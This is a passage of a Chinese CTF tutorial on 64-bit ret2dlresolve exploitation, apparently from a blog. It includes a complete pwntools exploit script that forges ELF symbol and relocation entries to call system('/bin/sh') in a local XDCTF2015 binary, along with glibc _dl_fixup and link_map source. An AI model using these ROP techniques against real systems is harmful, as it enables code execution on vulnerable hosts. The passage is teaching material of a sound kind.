*/</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>

<p>其中</p>
<ul>
<li>Elf64_Word 32 位</li>
<li>Elf64_Section 16 位</li>
<li>Elf64_Addr 64 位</li>
<li>Elf64_Xword 64 位</li>
</ul>
<p>所以，Elf64_Sym 的大小为 24 个字节。</p>
<p>除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)</span><br><span class="line">.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p</span><br><span class="line">.plt:0000000000400510                 jmp     cs:off_601018</span><br><span class="line">.plt:0000000000400510 _write          endp</span><br><span class="line">.plt:0000000000400510</span><br><span class="line">.plt:0000000000400516 ; ---------------------------------------------------------------------------</span><br><span class="line">.plt:0000000000400516                 push    0</span><br><span class="line">.plt:000000000040051B                 jmp     sub_400500</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level="debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["tmux","splitw","-h"]</span></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line">io = process(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'\x00'</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2dlresolve_x64</span><span class="params">(elf, store_addr, func_name, resolve_addr)</span>:</span></span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">'.rela.plt'</span>).header.sh_addr</span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">"DT_RELAENT"</span>) <span class="comment"># reloc entry size</span></span><br><span class="line"></span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">"DT_SYMENT"</span>) <span class="comment"># symbol entry size</span></span><br><span class="line"></span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake function string</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+len(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)/<span class="number">24</span></span><br><span class="line">    resolve_data +=<span class="string">'\x00'</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake reloc </span></span><br><span class="line">    reloc_addr = store_addr+len(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset % relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)/<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data +=<span class="string">'\x00'</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line">sh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">'\x00'</span>)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, <span class="string">"system"</span>,elf.got[<span class="string">"write"</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,store_addr,len(resolve_data)+len(sh)))  </span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">"a"</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(len(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"><span class="comment"># send resolve data</span></span><br><span class="line">io.send(resolve_data+sh)</span><br><span class="line">bin_sh_addr = store_addr+len(resolve_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop = ROP("./main_partial_relro_64")</span></span><br><span class="line"><span class="comment"># rop.raw(offset*'\x00')</span></span><br><span class="line"><span class="comment"># sh = "/bin/sh\x00"</span></span><br><span class="line"><span class="comment"># bin_sh_addr = store_addr+len(resolve_data)</span></span><br><span class="line"><span class="comment"># rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))</span></span><br><span class="line"><span class="comment"># rop.raw(vuln_addr)</span></span><br><span class="line"><span class="comment"># rop.raw("a"*(256-len(rop.chain())))</span></span><br><span class="line"><span class="comment"># io.send(rop.chain())</span></span><br><span class="line"><span class="comment"># io.send(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak link_map addr</span></span><br><span class="line">rop = ROP(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'write'</span>],<span class="number">1</span>,<span class="number">0x601008</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">'\x00'</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">print(hex(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span></span><br><span class="line">rop = ROP(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">'\x00'</span>*(<span class="number">256</span>-len(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">"./main_partial_relro_64"</span>)</span><br><span class="line">rop.raw(offset*<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>) <span class="comment"># 0x00000000004007a3: pop rdi; ret; </span></span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line"><span class="comment"># rop.raw('\x00'*(256-len(rop.chain())))</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看出，在上面的测试中，我们仍然利用 write 函数泄露了 link_map 的地址，那么，如果程序中没有输出函数，我们是否还能够发起利用呢？答案是可以的。我们再来看一下 <code>_dl_fix_up</code> 的实现</p>
<p>可以看出，在上面的测试中，我们仍然利用 write 函数泄露了 link_map 的地址，那么，如果程序中没有输出函数，我们是否还能够发起利用呢？答案是可以的。我们再来看一下 <code>_dl_fix_up</code> 的实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don't look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// 判断符号的可见性</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取符号的版本信息</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">         not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">        &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查询待解析符号所在的目标文件的 link_map</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">         of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">         offset.  */</span></span><br><span class="line">        <span class="comment">// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line">        <span class="comment">// l_addr 为待解析函数所在文件的基地址</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE(result,</span><br><span class="line">                                    SYMBOL_ADDRESS(result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">         address) is also known.  */</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, <span class="literal">true</span>));</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果我们故意将 __builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0) 设置为 0，那么程序就会执行 else 分支。具体的，我们设置 sym-&gt;st_other 不为 0 即可满足这一条件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the st_other field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_VISIBILITY(o)        ((o) &amp; 0x03)</span></span><br><span class="line"><span class="comment">/* For ELF64 the definitions are the same.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)</span></span><br><span class="line"><span class="comment">/* Symbol visibility specification encoded in the st_other field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STV_DEFAULT        0                <span class="comment">/* Default symbol visibility rules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STV_INTERNAL        1                <span class="comment">/* Processor specific hidden class */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STV_HIDDEN        2                <span class="comment">/* Sym unavailable in other modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STV_PROTECTED        3                <span class="comment">/* Not preemptible, not exported */</span></span></span><br></pre></td></tr></table></figure>

<p>此时程序计算 value 的方式为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = l-&gt;l_addr + sym-&gt;st_value</span><br></pre></td></tr></table></figure>

<p>通过查看 link_map 结构体的<a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map" target="_blank" rel="noopener">定义</a>，可以知道 l_addr 是 link_map 的第一个成员，那么如果我们伪造上述这两个变量，并借助于已有的被解析的函数地址，比如</p>
<ul>
<li>伪造 link_map-&gt;l_addr 为已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx</li>
<li>伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置，即相当于有了一个隐式的信息泄露</li>
</ul>
<p>那就可以得到对应的目标地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line">    ElfW(Addr) l_addr;                <span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">                                   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;                <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;                <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br></pre></td></tr></table></figure>

<p>一般而言，至少有 __libc_start_main 已经解析过了。本例中，显然不止这一个函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.got:0000000000600FF0 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.got:0000000000600FF0</span><br><span class="line">.got:0000000000600FF0 ; Segment type: Pure data</span><br><span class="line">.got:0000000000600FF0 ; Segment permissions: Read&#x2F;Write</span><br><span class="line">.got:0000000000600FF0 ; Segment alignment &#39;qword&#39; can not be represented in assembly</span><br><span class="line">.got:0000000000600FF0 _got            segment para public &#39;DATA&#39; use64</span><br><span class="line">.got:0000000000600FF0                 assume cs:_got</span><br><span class="line">.got:0000000000600FF0                 ;org 600FF0h</span><br><span class="line">.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main</span><br><span class="line">.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r</span><br><span class="line">.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__</span><br><span class="line">.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r</span><br><span class="line">.got:0000000000600FF8 _got            ends</span><br><span class="line">.got:0000000000600FF8</span><br><span class="line">.got.plt:0000000000601000 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.got.plt:0000000000601000</span><br><span class="line">.got.plt:0000000000601000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0000000000601000 ; Segment permissions: Read&#x2F;Write</span><br><span class="line">.got.plt:0000000000601000 ; Segment alignment &#39;qword&#39; can not be represented in assembly</span><br><span class="line">.got.plt:0000000000601000 _got_plt        segment para public &#39;DATA&#39; use64</span><br><span class="line">.got.plt:0000000000601000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0000000000601000                 ;org 601000h</span><br><span class="line">.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r</span><br><span class="line">.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r</span><br><span class="line">.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0000000000601020 off_601020      